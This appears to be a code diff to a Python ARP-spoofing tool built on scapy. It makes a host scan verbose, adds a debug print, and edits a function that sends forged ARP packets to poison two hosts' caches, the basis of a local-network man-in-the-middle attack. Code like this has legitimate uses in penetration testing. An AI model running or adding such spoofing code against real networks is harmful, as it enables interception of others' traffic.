@@ -49,7 +49,7 @@ class ArpSpoof(threading.Thread):
                 continue  # scapy does not support arp-ing on non-primary network interfaces
             if net:
                 try:
-                    ans, unans = scapy.layers.l2.arping(net, iface=iface, timeout=1, verbose=False)
+                    ans, unans = scapy.layers.l2.arping(net, iface=iface, timeout=1, verbose=True)
                     for s, r in ans.res:
                         try:
                             self.ip_mac_pairs[r.psrc] = r.hwsrc
@@ -76,9 +76,11 @@ class ArpSpoof(threading.Thread):
         raise Exception("Failed to obtain local mac address")
 
     def spoof_arp(self):
+        print([self.host_mac, self.tIP, self.vIP])
         sendp([
-            Ether() / ARP(op="who-has", hwsrc=self.host_mac, psrc=self.tIP, pdst=self.vIP),
-            Ether() / ARP(op="who-has", hwsrc=self.host_mac, psrc=self.vIP, pdst=self.tIP)])
+            Ether() / ARP(op=ARP.who_has, hwsrc=self.host_mac, psrc=self.tIP, pdst=self.vIP),
+            Ether() / ARP(op=ARP.who_has, hwsrc=self.host_mac,psrc=self.vIP, pdst=self.tIP)
+        ])
 
     def run(self):
         # self.scan_local_network()
